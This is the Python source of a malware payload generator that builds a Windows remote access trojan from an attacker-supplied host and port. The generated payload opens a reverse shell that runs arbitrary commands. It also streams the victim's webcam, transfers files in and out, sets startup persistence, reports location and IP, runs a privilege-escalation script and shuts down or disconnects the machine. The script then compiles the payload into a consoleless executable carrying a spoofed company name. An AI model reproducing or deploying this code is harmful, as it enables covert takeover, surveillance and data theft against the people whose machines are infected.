import os
import time
from colorama import init, Fore, Back, Style
import argparse
import math
import textwrap

init(autoreset=True)

# paser = argparse.ArgumentParser(description='K1B0R Framework Payload Generator | Framework Created By MalwareMix')
# paser.add_argument('--lhost', type=int, help='Set The Host That The Payload Will Connect Back To')
# paser.add_argument('--lport', type=int, help='Set The Port That The Payload Will Connect Back To')
# paser.add_argument('--help', type=int, help='Display The Full Help Banner')
# paser.add_argument('--normal', type=int, help='Generates The Normal Payload Without Converting It To A Windows EXE')
# paser.add_argument('--linux', type=int, help='Selects Linux As Main OS Target')
# paser.add_argument('--windows', type=int, help='Selects Windows As Main OS Target')

def write_file(path, text):
    file_write = open(path, "w")
    file_write.write(text)
    file_write.close()

uwu = input(':> ')
lhost = uwu

owo = input(':> ')
lport = owo

write_file('paygentestpayload.py', f"""
import socket
import subprocess
import os
import winreg as reg
import time
import webbrowser
import platform
import urllib.request
import json
from ctypes import windll
import string
# import pyscreenshot
import cv2
import os
import struct
from io import BytesIO
import numpy as np
import pygame

# For Adding File To Windows Startup
# def AddToStartup(f_name, path): 
      
#     # Combine Path and Filename
#     address=os.path.join(path, f_name)    
#     # Key To Change: HKEY_CURRENT_USER  
#     # Key Value: Software\Microsoft\Windows\CurrentVersion\Run
#     key = reg.HKEY_CURRENT_USER
#     key_value = "Software//Microsoft//Windows//CurrentVersion//Run"
#     open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
#     reg.SetValueEx(open, "any_name", 0, reg.REG_SZ, address) 
#     reg.CloseKey(open)

# Connecting Target To Attacker

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Try Until Not Connected
    connected = False
    while (connected == False):
        try:
            
            # Note: Please Place Attacker's IP Here
            s.connect(('{lhost}', {lport}))

            # Connected
            connected = True

            # Sending Current Working Directory Of Target To Attacker
            cwd = os.getcwd()
            s.send(("dir:" + str(cwd)).encode('utf-8'))
            
        except:
            # If Failed To Connect, Print A Dot And Try Again
            print(".", end="")

    while True:
        try:
            # Recieve Command From Attacker
            command = s.recv(2048).strip().decode('utf-8')

            # Terminate Script
            if 'terminate' in command:
                s.close()
                break 

            elif 'trollsploit.fbi_openup' in command:
                url = 'https://www.youtube.com/watch?v=ScUAiJj6D5M'
                webbrowser.get().open(url)

            elif 'sysctl.restart' in command:
                try:
                    os.system('shutdown /r')
                except:
                    'null'

            elif 'trollsploit.rickroll' in command:
                try:
                    url = 'https://www.youtube.com/watch?v=xvFZjo5PgG0'
                    webbrowser.get().open(url)
                except:
                    'null'

            elif 'spy.webcam_stream' in command:
                try:
                    time.sleep(3)
                    # Capture frame
                    cap = cv2.VideoCapture(0)
                    # If the computer is a laptop and or uses an internal camer keep this at 0 but if it has a external camera
                    # Fiddle around with it the range is useually 0,1,2,3,4 Make sure to start the cameraserver.py first to capture and see the feed
                    # Full instructions will be in the instructions.md file!

                    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    client_socket.connect(('chance this to your lhost', 8080))

                    while cap.isOpened():
                        _, frame = cap.read()

                        memfile = BytesIO()
                        np.save(memfile, frame)
                        memfile.seek(0)
                        data = memfile.read()
                        client_socket.sendall(struct.pack("L", len(data)) + data)
                        if cv2.waitKey(1) & 0xFF == ord('q'):
                            break

                    cap.release()
                except:
                    'null'

            elif 'migrate' in command:
                try:
                    os.system('powershell cp ~/Desktop/hehe.exe C:/temp/')
                    s.close()
                    os.system('powershell C:/temp/hehe.exe -e cmd.exe')
                except:
                    return 'null'


            elif 'data.ip' in command:
                try:
                    csocket = s.accept()
                    public_ip = urllib.request.urlopen('https://api.ipify.org/').read().decode('utf-8')
                    csocket.send(public_ip.encode('utf-8'))
                except:
                    return 'null'

            elif 'systemctl.eject' in command:
                try:
                    os.system('powershell (New-Object -com "WMPlayer.OCX.7").cdromcollection.item(0).eject()')
                except:
                    'null'

            elif 'data.location' in command:
                try:
                    data = urllib.request.urlopen('https://freegeoip.app/json/').read().decode('utf-8')
                    json_data = json.loads(data)
                    country_name = json_data['country_name']
                    city = json_data['city']
                    message = f'[+] Current Location: ' + country_name +  city
                    s.send(message.encode('utf-8'))
                    s.close()
                except:
                    'null'

            elif 'priv.exec' in command:
                try:
                    s.close()
                    os.system('powershell C:/temp/privesc.ps1')
                except:
                    'null'


            elif 'data.ip' in command:
                try:
                    data = urllib.request.urlopen('https://api.ipify.org/').read().decode('utf-8')
                    s.send(data.encode('utf-8'))
                    s.close()
                except:
                     'null'

            elif 'data.os' in command:
                try:
                    message = platform.system()
                    s.send(message.encode('utf-8'))
                    s.close()
                except:
                    'null'

            # elif 'spy.webcam_snap' in command:
            #     try:
            #         videoCaptureObject = cv2.VideoCapture(1)
            #         result = True
            #         while(result):
            #             ret,frame = videoCaptureObject.read()
            #             cv2.imwrite("NewPicture.jpg",frame)
            #             os.system("powershell mv NewPicture.jpg ~/Desktop")
            #             result = False
            #         videoCaptureObject.release()
            #         cv2.destroyAllWindows()    
            #     except:
            #         'null'

            # elif 'spy.screenshot' in command:
            #     try:
            #         message = pyscreenshot.grab(bbox=(0, 0, 1920, 1080))
            #         filename = 'screenshot.png'
            #         message.save(filename)
            #         # message.save('screenshot.png')
            #         s.send(filename.encode('ascii'))
            #     except:
            #         'null'

            elif 'sysctl.shutdown' in command:
                try:
                    os.system('shutdown /s')
                except:
                    'null'

            elif 'data.core' in command:
                try:
                    message = platform.machine()
                    s.send(message.encode('utf-8'))
                    s.close()
                except:
                    'null'

            elif 'spy.webcam_snap' in command:
                try:
                    pygame.camera.init()
                    pygame.camera.list_cameras() #Camera detected or not
                    cam = pygame.camera.Camera("/dev/video0",(640,480))
                    cam.start()
                    img = cam.get_image()
                    pygame.image.save(img,"filename.jpg")
                    s.send(img.encode('utf-8'))
                except:
                    'null'

            elif 'data.hostname' in command:
                try:
                    message = socket.getfqdn(socket.gethostname()).strip()
                    s.send(message.encode('utf-8'))
                    s.close()
                except:
                    'null'

            elif 'sysctl.disable_wifi' in command:
                try:
                    os.system('netsh wlan disconnect')
                except:
                    'null'

            elif 'sysctl.list_drives' in command:
                def get_drives(message):
                    drives = []
                    bitmask = windll.kernel32.GetLogicalDrives()
                    for letter in string.ascii_uppercase:
                        if bitmask & 1:
                            drives.append(letter)
                        bitmask >>= 1
                    return drives
                if __name__ == '__main__':   # On my PC, this prints ['A', 'C', 'D', 'F', 'H']
                    get_drives.message = get_drives()
                    s.send(message.encode('utf-8'))
                    s.close()

            # Grabbing Files
            # Example: grab picture.jpg
            elif command.startswith('download'):

                # Extracting filename From Command
                # Skipping 1st Five Characters
                # Because They Are 'g', 'r', 'a', 'b', ' '
                file_name = command[5:]

                # Getting File Size
                file_size = os.path.getsize(file_name)

                # Sending File Name
                s.send(file_name.encode('utf-8'))

                # Recieving Response From Target
                # e.g., OK Response
                s.recv(1024).decode('utf-8')

                # Sending File Size
                s.send(str(file_size).encode('utf-8'))

                # Recieving Response
                s.recv(1024).decode('utf-8')

                # Opening File To Read
                # File Will Be Sent In Small Chunks Of Data
                with open(file_name, "rb") as file:

                    # Chunks Sent = 0
                    c = 0
                    
                    # Starting Time
                    start_time = time.time()

                    # Running Loop Until c < file_size
                    while c < file_size:

                        # Read 1024 Bytes
                        data = file.read(1024)

                        # If No Bytes, Stop
                        if not (data):
                            break

                        # Send Bytes
                        s.sendall(data)

                        # Chunks Sent += Length Of Data
                        c += len(data)

                    # Ending Time
                    end_time = time.time()

            # Transfer File From Attacker To Target
            # Example: video.mp4
            elif 'upload' in command:

                # Recieving Name Of File To Be Transferred
                file_name = s.recv(1024).decode('utf-8')

                # Sending Response
                s.send('OK'.encode('utf-8'))

                # Recieving Size Of File To Be Transferred
                file_size = s.recv(1024).decode('utf-8')

                # Sending Response
                s.send('OK'.encode('utf-8'))

                # Opening File For Writing
                with open(file_name, "wb") as file:

                    # Chunks Recieved
                    c = 0
                    
                    # Starting Time
                    start_time = time.time()

                    # Running Until c < int(file_size)
                    while c < int(file_size):

                        # Recieve 1024 Bytes
                        data = s.recv(1024)

                        # If No Data, Stop
                        if not (data):
                            break

                        # Write Bytes To File
                        file.write(data)

                        # Chunks Added
                        c += len(data)

                    # Ending Time
                    end_time = time.time()

            # Changing Working Directory Of Target
            # Example: D:/
            elif command.startswith('cd '):

                # Extracting Directory
                # Skipping 3 Characters
                # They Are 'c', 'd', ' '
                dir = command[3:]

                # Change Directory
                try:
                    os.chdir(dir)

                except:
                    # If Failed, Revert
                    os.chdir(cwd)

                # Get Updated Working Directory
                cwd = os.getcwd()
                
                # Send Updated Directory To Attacker
                s.send(("dir:" + str(cwd)).encode('utf-8'))

            # Putting File In Startup Folder
            # Only Works For Windows
            # Example: starup T.py
            elif command.startswith('startup'):

                # Extracting Filename
                file_name = command[8:]

                # Extracting Path Of File
                # As File Is In Current Working Directory
                # Get Current Working Directory
                pth = os.getcwd()

                # Put File In Startup
                try:
                    AddToStartup(file_name, pth)

                    # Send OK To Attacker
                    s.send("OK".encode('utf-8'))

                # If Failed, Send Exception Message To Attacker
                except Exception as e:
                    s.send(str(e).encode('utf-8'))

            # Otherwise The Command Will Be Considered As CMD OR Terminal Command
            # Command Will Be Executed In Terminal
            else:
                # Executing Command
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                # If Command Executes Succefully
                # Get Output Of Command
                out = CMD.stdout.read()

                # If Error Occured
                # Get Error Of Command
                err = CMD.stderr.read()

                # Send Output
                s.send(out)

                # Send Error
                s.send(err)

                # Some Commads Are Executed Successfully, But
                # They Don't Have Any Output
                # For Example: del file.ext
                # Above Command On Execution Doesn't Show Any Output
                # Put Our Attacker Is Alwayes Looking For Output
                # So, If There Is No Output And No Error
                # Send OK
                if (out == b'' and err == b''):
                    s.send("OK".encode('utf-8'))
                    
        # If Attacker Command Was Unable To Be Executed
        except Exception as e:

            # Send Exception Message To Attacker
            s.send(str(e).encode('utf-8'))


# Start Of Script
# If Connection Breaks
# Script Tries To Connect Again And Again


connected = False
while (not connected):
    try:
        connect()
        connected = True
    except:
        print(".", end = "")
""")
print('[+] Payload Generated!')

print('[!] Enter The Name For The Project!')
hehe = input(':> ')

# s
os.system(f'C:/Users/narut/AppData/Local/Programs/Python/Python39/Scripts/nuitka.bat --windows-disable-console --windows-product-version=1.1 --windows-company-name={hehe} --onefile --plugin-enable=numpy --plugin-enable=pylint-warnings ./paygentestpayload.py')